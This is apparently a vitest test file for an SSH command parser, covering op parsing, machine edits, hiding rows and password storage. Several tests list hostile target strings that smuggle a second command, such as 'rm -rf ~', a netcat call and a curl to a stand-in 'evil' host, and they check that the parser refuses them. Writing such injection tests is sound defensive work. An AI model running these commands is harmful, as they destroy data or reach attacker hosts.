/**
 * The ssh-op parser: the boundary between a palette's JSON and a real shell.
 *
 * Everything downstream of this function eventually gets typed into a pane, so
 * the interesting assertions are the two kinds of refusal it makes:
 *
 * - **No target.** `connect` with neither a machine nor a target is refused
 *   rather than resolved to "ssh to nowhere", because the alternative is a pane
 *   that opens and sits at a local prompt looking like a successful connect.
 * - **A target is one destination, not a shell.** A pasted `ssh user@host -p
 *   2222` is admitted, because that is how a machine reaches a palette, but only
 *   as tokens the parser understands. Anything carrying a shell metacharacter is
 *   dropped, which is what keeps `{"target": "host; rm -rf ~"}` from becoming two
 *   commands.
 *
 * The normalisation cases matter for the same reason: a machine that arrives
 * over the wire is rebuilt through the same `makeMachine` the roster uses, so a
 * string `port` or a `source` nobody defined cannot reach the connect line.
 *
 * The mutating ops carry one more rule each. `edit` is the only op whose payload
 * has two readings of a field - absent means "leave it alone", present-and-empty
 * means "clear it" - and the tests below pin that distinction, because losing it
 * would turn a form that looks editable into one that cannot undo a field.
 * `hide` is a refusal to pretend: it takes the same machine-or-target argument
 * as `save`, and whether "deleted" or "hidden" happened is the service's answer,
 * not the parser's.
 */
import { describe, expect, it } from 'vitest'
import { isProReject, machineOf, parseProSsh, type ProSshRequest } from '../src/shared/proIpc'
import type { MachineEdit } from '../src/shared/ssh'

/** Narrow a parse to a request, failing the test if it was rejected. */
function parsed(payload: unknown): ProSshRequest {
  const result = parseProSsh(payload)
  if (isProReject(result)) {
    throw new Error(`expected a request, got ${result.code}: ${result.error}`)
  }
  return result
}

/** The rejection side of a parse, as a code/message pair. */
function refused(payload: unknown): { code: string; error: string } {
  const result = parseProSsh(payload)
  if (!isProReject(result)) throw new Error(`expected a rejection, got ${JSON.stringify(result)}`)
  return { code: result.code, error: result.error }
}

/** An `edit` parse narrowed to its request, failing the test if it was refused. */
function editRequest(payload: unknown): Extract<ProSshRequest, { op: 'edit' }> {
  const request = parsed(payload)
  if (request.op !== 'edit') throw new Error(`expected an edit, got ${request.op}`)
  return request
}

/** The patch inside one, which is the part an edit test is usually about. */
function edited(payload: unknown): MachineEdit {
  return editRequest(payload).patch
}

/** A `hide` parse narrowed the same way. */
function hideRequest(payload: unknown): Extract<ProSshRequest, { op: 'hide' }> {
  const request = parsed(payload)
  if (request.op !== 'hide') throw new Error(`expected a hide, got ${request.op}`)
  return request
}

/** A `set-password` parse narrowed the same way. */
function passwordRequest(
  payload: unknown
): Extract<ProSshRequest, { op: 'set-password' }> {
  const request = parsed(payload)
  if (request.op !== 'set-password') throw new Error(`expected set-password, got ${request.op}`)
  return request
}

describe('the ops that need nothing', () => {
  it('reads an empty or nonsense payload as `list`, since asking is the default', () => {
    const empties: unknown[] = [{}, null, undefined, 'nonsense', 42, []]
    for (const payload of empties) {
      expect(parsed(payload)).toEqual({ op: 'list', query: '' })
    }
  })

  it('trims and folds the op, because it arrives in JSON we did not write', () => {
    expect(parsed({ op: '  KEYS ' })).toEqual({ op: 'keys' })
    expect(parsed({ op: 'Terminal', cwd: '/tmp' })).toEqual({ op: 'terminal', cwd: '/tmp' })
  })

  it('names the op it refused', () => {
    const bad = refused({ op: 'formatDisk' })
    expect(bad.code).toBe('bad-op')
    expect(bad.error).toContain('formatDisk')
  })

  it('takes `keys` with no arguments and drops whatever else came along', () => {
    expect(parsed({ op: 'keys', machine: { host: 'x' } })).toEqual({ op: 'keys' })
  })
})

describe('list', () => {
  it('trims the filter and accepts the short alias for it', () => {
    expect(parsed({ op: 'list', query: '  prod  ' })).toEqual({ op: 'list', query: 'prod' })
    expect(parsed({ op: 'list', q: 'web' })).toEqual({ op: 'list', query: 'web' })
  })

  it('caps the filter, so a pasted megabyte cannot become a roster scan', () => {
    const request = parsed({ op: 'list', query: 'a'.repeat(5000) })
    if (request.op !== 'list') throw new Error('expected list')
    expect(request.query).toHaveLength(200)
  })
})

describe('remove', () => {
  it('needs an id, and says so rather than removing nothing', () => {
    expect(refused({ op: 'remove' }).code).toBe('bad-machine')
    expect(refused({ op: 'remove', id: '   ' }).code).toBe('bad-machine')
  })

  it('trims the id it hands to the store', () => {
    expect(parsed({ op: 'remove', id: '  m1  ' })).toEqual({ op: 'remove', id: 'm1' })
  })
})

describe('terminal', () => {
  it('means home when no directory came with it', () => {
    expect(parsed({ op: 'terminal' })).toEqual({ op: 'terminal', cwd: '' })
  })

  it.each([
    ['cwd', '/tmp/a'],
    ['workdir', '/tmp/b'],
    ['path', '/tmp/c']
  ])('reads the directory out of `%s`', (field, value) => {
    expect(parsed({ op: 'terminal', [field]: value })).toEqual({ op: 'terminal', cwd: value })
  })
})

describe('the machine-or-target rule', () => {
  const ops = ['probe', 'save', 'edit', 'hide', 'connect', 'setup'] as const

  it.each(ops)('%s refuses a payload with neither a machine nor a target', (op) => {
    const bad = refused({ op })
    expect(bad.code).toBe('bad-machine')
    expect(bad.error).toContain('machine')
  })

  it.each(ops)('%s refuses a machine blob with no host and no alias', (op) => {
    expect(refused({ op, machine: { user: 'alice', port: 22 } }).code).toBe('bad-machine')
  })

  it('accepts a target on its own, leaving the machine for the service to build', () => {
    const request = parsed({ op: 'probe', target: 'alice@box:2222' })
    if (request.op !== 'probe') throw new Error('expected probe')
    expect(request.machine).toBeNull()
    expect(request.target).toBe('alice@box:2222')
  })

  it.each(ops)('%s drops a target that smuggles a second command', (op) => {
    // Not a sanitiser - a category rule. `host; rm -rf ~` is two commands, and
    // the field only ever means one destination, so it is refused outright
    // instead of being cut down to the part before the semicolon. A single token
    // with a metacharacter in it (`box;id`) is a different case: it names one
    // destination, and `shellQuote` keeps it one argument when the line is typed.
    for (const target of ['box ; rm -rf ~', 'box | nc evil 9', 'box && curl evil', 'ssh box; rm -rf ~', 'box\nrm -rf ~']) {
      expect(refused({ op, target }).code, target).toBe('bad-machine')
    }
  })

  // `edit` is out of this one, not out of the rule: it refuses a payload with no
  // patch before it ever reads the target, which is the right order (an edit with
  // nothing to change is a no-op the caller should hear about). Its pasted-command
  // case lives in the `edit` block below, where a patch comes with it.
  const dialing = ops.filter((op) => op !== 'edit')

  it.each(dialing)('%s keeps a pasted ssh command line, spaces and all', (op) => {
    // The string a user copies out of a README. Refusing it would send them to a
    // terminal to take it apart by hand, which is the exact step the palette
    // exists to remove.
    const request = parsed({ op, target: 'ssh wanlian@172.18.29.206 -p 2222' })
    if (
      request.op !== 'probe' &&
      request.op !== 'save' &&
      request.op !== 'edit' &&
      request.op !== 'hide' &&
      request.op !== 'connect' &&
      request.op !== 'setup'
    ) {
      throw new Error('expected a machine op')
    }
    expect(request.target).toBe('ssh wanlian@172.18.29.206 -p 2222')
  })

  it.each(ops)('%s drops two bare words, which name no machine', (op) => {
    expect(refused({ op, target: 'two words' }).code).toBe('bad-machine')
  })
})

describe('connect', () => {
  it('pins by default, because the second connect should cost one keystroke', () => {
    const request = parsed({ op: 'connect', target: 'alice@box' })
    if (request.op !== 'connect') throw new Error('expected connect')
    expect(request.save).toBe(true)
  })

  it('honours an explicit false, and only a real boolean', () => {
    const off = parsed({ op: 'connect', target: 'alice@box', save: false })
    if (off.op !== 'connect') throw new Error('expected connect')
    expect(off.save).toBe(false)

    // A string is not a decision. Falling back to the default beats reading
    // `"no"` as false and then pinning nothing the human asked about.
    const lied = parsed({ op: 'connect', target: 'alice@box', save: 'no' })
    if (lied.op !== 'connect') throw new Error('expected connect')
    expect(lied.save).toBe(true)
  })

  it('carries the directory a session opens in', () => {
    const request = parsed({ op: 'connect', target: 'box', workdir: '/repo' })
    if (request.op !== 'connect') throw new Error('expected connect')
    expect(request.cwd).toBe('/repo')
  })
})

describe('setup', () => {
  it('runs by default, and can be asked for the plan only', () => {
    const run = parsed({ op: 'setup', target: 'box' })
    if (run.op !== 'setup') throw new Error('expected setup')
    expect(run.run).toBe(true)

    const plan = parsed({ op: 'setup', target: 'box', run: false })
    if (plan.op !== 'setup') throw new Error('expected setup')
    expect(plan.run).toBe(false)
  })

  it('trims the key it would publish', () => {
    const request = parsed({ op: 'setup', target: 'box', key: '  ~/.ssh/id_ed25519.pub  ' })
    if (request.op !== 'setup') throw new Error('expected setup')
    expect(request.key).toBe('~/.ssh/id_ed25519.pub')
  })
})

describe('edit', () => {
  const machine = { host: 'box', user: 'alice' }

  it('trims what it takes, and leaves the machine blob it was handed alone', () => {
    // The parser normalises, it does not apply. `machine.label` is still the one
    // the caller built, because merging a patch into a machine is `editMachine`'s
    // job in main - doing it here as well would leave two places to get it wrong.
    const request = editRequest({ op: 'edit', machine, patch: { label: '  lab  ' } })
    expect(request.patch).toEqual({ label: 'lab' })
    expect(request.machine?.label).toBe('alice@box')
    expect(request.target).toBe('')
  })

  it('reads an absent field as "leave it" and an empty one as "clear it"', () => {
    // The reason `edit` is not `{ ...machine, ...patch }` on the wire: ProxyJump
    // has to be blank-able, and `host` has to stay out of the patch when nobody
    // touched the field. A truthiness test collapses both readings into one, and
    // what is left is a form that looks editable and cannot undo anything.
    const patch = edited({ op: 'edit', machine, patch: { proxyJump: '', user: ' root ' } })
    expect(patch).toEqual({ proxyJump: '', user: 'root' })
    expect('host' in patch).toBe(false)
    expect('identityFile' in patch).toBe(false)
  })

  it('keeps a pasted ssh command line as the target, patch and all', () => {
    // Renaming a row that only ever existed as a typed line: there is no machine
    // blob to send, so the target is what the edit forks from, and it is held to
    // the same one-destination rule as every other machine op.
    const request = editRequest({
      op: 'edit',
      target: 'ssh wanlian@172.18.29.206 -p 2222',
      patch: { label: 'ubuntu box' }
    })
    expect(request.target).toBe('ssh wanlian@172.18.29.206 -p 2222')
    expect(request.machine).toBeNull()
  })

  it('clamps a port to a port, including the empty one that means no port', () => {
    expect(edited({ op: 'edit', machine, patch: { port: '2222' } })).toEqual({ port: 2222 })
    expect(edited({ op: 'edit', machine, patch: { port: '' } })).toEqual({ port: 0 })
    expect(edited({ op: 'edit', machine, patch: { port: 99999 } })).toEqual({ port: 0 })
    expect(edited({ op: 'edit', machine, patch: { port: 'lots' } })).toEqual({ port: 0 })
  })

  it('will not take `source` from a caller, since where a row came from is a fact', () => {
    const patch = edited({ op: 'edit', machine, patch: { source: 'saved', label: 'x' } })
    expect(patch).toEqual({ label: 'x' })
    expect('source' in patch).toBe(false)
  })

  it('caps a field, so a pasted blob cannot become a stored machine', () => {
    expect(edited({ op: 'edit', machine, patch: { label: 'a'.repeat(5000) } }).label).toHaveLength(
      200
    )
  })

  it('refuses an empty patch rather than reporting an edit that changed nothing', () => {
    const bad = refused({ op: 'edit', machine, patch: {} })
    expect(bad.code).toBe('bad-machine')
    expect(bad.error).toContain('at least one field')
  })

  it('reads the flat form too, which is what a one-line command sends', () => {
    // `pro ssh edit box --label lab` has no reason to invent a nested object, and
    // the palette's form is not the only caller this parser answers to.
    expect(edited({ op: 'edit', machine, label: 'lab' })).toEqual({ label: 'lab' })
    expect(edited({ op: 'edit', target: 'alice@box', host: '  10.0.0.9 ' })).toEqual({
      host: '10.0.0.9'
    })
  })
})

describe('hide, unhide and the restore list', () => {
  it('hides by machine, and asks for nothing else', () => {
    const request = hideRequest({ op: 'hide', machine: { host: 'box', user: 'alice' } })
    expect(request.machine?.host).toBe('box')
    expect(request.target).toBe('')
  })

  it('hides by target, folding the string the way every other machine op does', () => {
    // The row a human dismisses may be one they typed a minute ago, so there is no
    // machine blob to send back - only the line still sitting in the input.
    expect(parsed({ op: 'hide', target: 'alice@box:2222' })).toEqual({
      op: 'hide',
      machine: null,
      target: 'alice@box:2222'
    })
  })

  it('restores by key, trimmed, with `id` accepted as an alias for it', () => {
    expect(parsed({ op: 'unhide', key: '  alias:prod  ' })).toEqual({
      op: 'unhide',
      key: 'alias:prod'
    })
    expect(parsed({ op: 'unhide', id: 'host:box:2222:alice' })).toEqual({
      op: 'unhide',
      key: 'host:box:2222:alice'
    })
  })

  it('needs a key to restore, because a guessed one unhides the wrong row', () => {
    expect(refused({ op: 'unhide' }).code).toBe('bad-machine')
    expect(refused({ op: 'unhide', key: '   ' }).code).toBe('bad-machine')
  })

  it('caps the key, since it is a stored string and not a query', () => {
    const request = parsed({ op: 'unhide', key: `alias:${'p'.repeat(400)}` })
    if (request.op !== 'unhide') throw new Error('expected unhide')
    expect(request.key).toHaveLength(160)
  })

  it('takes `hidden` with no arguments and drops whatever else came along', () => {
    expect(parsed({ op: 'hidden', key: 'ignored' })).toEqual({ op: 'hidden' })
  })
})

/**
 * The one op whose payload carries a secret.
 *
 * Two rules here are not the rules the other mutating ops have, and both are
 * about what a *missing* field means. Every other op reads an absent field as
 * "leave it alone", which for a password would mean a caller that forgot the
 * key silently wiped the keychain - so an absent `secret` is a refusal, and
 * clearing is spelled `null` on purpose. The second is that the value is never
 * trimmed: ssh compares bytes, and a password that ends in a space is a
 * password, so normalising it here would store one that cannot log in.
 */
describe('set-password', () => {
  it('takes a machine, a target, or the bare id, which is what the keychain keys by', () => {
    // The edit form stores the row first and then sends back only the id it got,
    // so an id on its own is the normal shape rather than a degraded one.
    expect(passwordRequest({ op: 'set-password', id: 'm1', secret: 'x' })).toMatchObject({
      op: 'set-password',
      machine: null,
      target: '',
      id: 'm1',
      secret: 'x'
    })
    expect(passwordRequest({ op: 'set-password', target: 'alice@box:2222', secret: null }).target).toBe(
      'alice@box:2222'
    )
    expect(
      passwordRequest({ op: 'set-password', machine: { host: 'box' }, secret: 'x' }).machine?.host
    ).toBe('box')
  })

  it('refuses a payload that names no row, rather than storing a secret against a guess', () => {
    const bad = refused({ op: 'set-password', secret: 'x' })
    expect(bad.code).toBe('bad-machine')
    expect(bad.error).toContain('machine')
  })

  it('reads an absent secret as a refusal and a null one as "forget it"', () => {
    const bad = refused({ op: 'set-password', id: 'm1' })
    expect(bad.code).toBe('bad-payload')
    // The message is the whole fix: it has to name both the field and the way
    // to clear it, or the caller retries with the field still missing.
    expect(bad.error).toContain('secret is required')
    expect(bad.error).toContain('null to clear')
    expect(passwordRequest({ op: 'set-password', id: 'm1', secret: null }).secret).toBeNull()
  })

  it('keeps the bytes it was given: no trim, no case folding, no collapsing', () => {
    expect(passwordRequest({ op: 'set-password', id: 'm1', secret: '  p@ss W0rd ' }).secret).toBe(
      '  p@ss W0rd '
    )
    // An empty string is the edit form's "clear the field", and it survives
    // parsing as itself - the service is the layer that reads it as a deletion.
    expect(passwordRequest({ op: 'set-password', id: 'm1', secret: '' }).secret).toBe('')
  })

  it('refuses a secret that is neither a string nor null', () => {
    for (const secret of [42, true, {}, [], ['x']]) {
      const bad = refused({ op: 'set-password', id: 'm1', secret })
      expect(bad.code, JSON.stringify(secret)).toBe('bad-payload')
      expect(bad.error, JSON.stringify(secret)).toContain('string or null')
    }
  })

  it('caps the length, and the refusal quotes the cap instead of the password', () => {
    const tooLong = 'x'.repeat(513)
    const bad = refused({ op: 'set-password', id: 'm1', secret: tooLong })
    expect(bad.code).toBe('bad-payload')
    expect(bad.error).toContain('512')
    expect(bad.error, 'an error string is a log line').not.toContain('xxx')
    expect(passwordRequest({ op: 'set-password', id: 'm1', secret: 'x'.repeat(512) }).secret).toHaveLength(512)
  })

  it('shares the target rule with the ops that dial: one destination, never a shell', () => {
    expect(refused({ op: 'set-password', target: 'box ; rm -rf ~', secret: 'x' }).code).toBe(
      'bad-machine'
    )
    expect(
      passwordRequest({
        op: 'set-password',
        target: 'ssh wanlian@172.18.29.206 -p 2222',
        secret: 'x'
      }).target
    ).toBe('ssh wanlian@172.18.29.206 -p 2222')
  })
})

describe('machineOf', () => {
  it('rebuilds a wire machine through the roster constructor', () => {
    const machine = machineOf({
      id: ' m1 ',
      host: '  10.0.0.5  ',
      port: '2222',
      user: ' deploy ',
      source: 'CONFIG'
    })
    expect(machine).not.toBeNull()
    expect(machine?.host).toBe('10.0.0.5')
    // A port arrives as a number, whatever the caller thought it was sending.
    expect(machine?.port).toBe(2222)
    expect(machine?.user).toBe('deploy')
    expect(machine?.source).toBe('config')
  })

  it('clamps a port that is not a port', () => {
    expect(machineOf({ host: 'box', port: 99999 })?.port).toBe(0)
    expect(machineOf({ host: 'box', port: 'lots' })?.port).toBe(0)
    expect(machineOf({ host: 'box', port: -3 })?.port).toBe(0)
  })

  it('falls back to `saved` for a source nobody defined', () => {
    expect(machineOf({ host: 'box', source: 'invented' })?.source).toBe('saved')
  })

  it('accepts an alias with no hostname, since config supplies the rest', () => {
    const machine = machineOf({ alias: 'prod' })
    expect(machine?.alias).toBe('prod')
    expect(machine?.host).toBe('prod')
  })

  it('labels an unlabelled machine the way a human would write it', () => {
    expect(machineOf({ host: 'box', user: 'alice' })?.label).toBe('alice@box')
    expect(machineOf({ host: 'box' })?.label).toBe('box')
  })

  it('refuses anything that is not a machine', () => {
    expect(machineOf(null)).toBeNull()
    expect(machineOf('box')).toBeNull()
    expect(machineOf({ user: 'alice' })).toBeNull()
  })
})
